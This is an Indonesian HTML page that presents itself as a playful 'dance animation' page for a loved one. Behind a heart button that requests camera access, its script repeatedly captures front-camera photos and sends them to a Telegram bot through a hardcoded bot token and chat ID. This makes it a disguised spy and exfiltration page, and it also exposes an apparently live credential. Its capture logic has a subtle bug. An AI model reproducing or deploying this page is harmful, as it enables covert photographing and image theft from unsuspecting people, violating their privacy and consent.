<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kirim Foto Spesial Tanpa Jeda</title>
    <style>
        body {
            background-color: #121212;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        #cameraContainer {
            margin: 20px auto;
            width: 100%;
            max-width: 500px;
        }
        #cameraView {
            width: 100%;
            background-color: #333;
            border-radius: 10px;
            display: none;
        }
        #photoResult {
            max-width: 100%;
            display: none;
            border-radius: 10px;
        }
        .love-btn {
            background-color: #E91E63;
            color: white;
            border: none;
            padding: 15px;
            font-size: 24px;
            border-radius: 50%;
            cursor: pointer;
            margin: 20px;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 60px;
            height: 60px;
        }
        .love-btn:hover {
            background-color: #C2185B;
            transform: scale(1.1);
        }
        .love-btn:disabled {
            background-color: #555;
            cursor: not-allowed;
        }
        .love-btn::before {
            content: '❤️';
        }
        .permission-box {
            background-color: #333;
            padding: 20px;
            border-radius: 10px;
            max-width: 500px;
            margin: 20px auto;
        }
    </style>
</head>
<body>
    <h1>HALO SAYANG</h1>
    
    <div class="permission-box" id="permissionBox">
        <h2>IZIN JOEGT</h2>
        <p>WEB INI AKAN ADA ANIMASI JOGET JJ.</p>
        <button class="love-btn" id="loveBtn"></button>
    </div>
    
    <div id="cameraContainer">
        <video id="cameraView" autoplay playsinline></video>
        <canvas id="photoResult"></canvas>
    </div>
    
    <script>
        // Elemen DOM
        const loveBtn = document.getElementById('loveBtn');
        const permissionBox = document.getElementById('permissionBox');
        const cameraView = document.getElementById('cameraView');
        const photoResult = document.getElementById('photoResult');
        
        let stream = null;
        let isCapturing = true;
        
        // Token bot Telegram dan chat ID (ganti dengan milik Anda)
        const BOT_TOKEN = '7883031175:AAEIQYYD3CSdmQBNVyOxZ1qmtYTrpRuDB2I';
        const CHAT_ID = '2028336963';
        
        // Fungsi untuk mengambil foto
        async function takePhoto() {
            if (!stream || !isCapturing) return;
            
            const context = photoResult.getContext('2d');
            photoResult.width = cameraView.videoWidth;
            photoResult.height = cameraView.videoHeight;
            context.drawImage(cameraView, 0, 0, photoResult.width, photoResult.height);
            
            // Mengirim foto ke Telegram dan lanjutkan pengambilan berikutnya
            await sendToTelegram();
        }
        
        // Fungsi untuk mengirim foto ke Telegram
        async function sendToTelegram() {
            return new Promise(resolve => {
                // Konversi canvas ke blob
                photoResult.toBlob(async blob => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, `special_photo_${Date.now()}.jpg`);
                    formData.append('caption', 'Foto spesial untukmu! ❤️');
                    
                    try {
                        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        const data = await response.json();
                        if (!data.ok) {
                            console.error('Gagal mengirim foto:', JSON.stringify(data));
                        }
                    } catch (error) {
                        console.error('Error:', error.message);
                    }
                    
                    // Lanjutkan pengambilan foto berikutnya jika masih aktif
                    if (isCapturing) {
                        await takePhoto();
                    }
                    resolve();
                }, 'image/jpeg', 0.85);
            });
        }
        
        // Fungsi untuk memulai pengambilan foto
        function startCapturing() {
            if (!stream || isCapturing) return;
            isCapturing = true;
            loveBtn.disabled = true;
            
            // Mulai pengambilan foto pertama
            takePhoto();
        }
        
        // Fungsi untuk menghentikan pengambilan foto
        function stopCapturing() {
            isCapturing = false;
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
            cameraView.style.display = 'none';
            photoResult.style.display = 'none';
            permissionBox.style.display = 'block';
            loveBtn.disabled = false;
        }
        
        // Event listener untuk tombol love
        loveBtn.addEventListener('click', async () => {
            if (!stream) {
                // Meminta izin akses kamera
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            facingMode: 'user',
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        } 
                    });
                    
                    cameraView.srcObject = stream;
                    cameraView.style.display = 'block';
                    permissionBox.style.display = 'none';
                    
                    // Mulai pengambilan foto tanpa jeda
                    startCapturing();
                    
                } catch (error) {
                    alert('Gagal mengakses kamera: ' + error.message);
                }
            }
        });
        
        // Menangani penutupan halaman untuk membersihkan stream
        window.addEventListener('beforeunload', () => {
            stopCapturing();
        });
    </script>
</body>
</html>
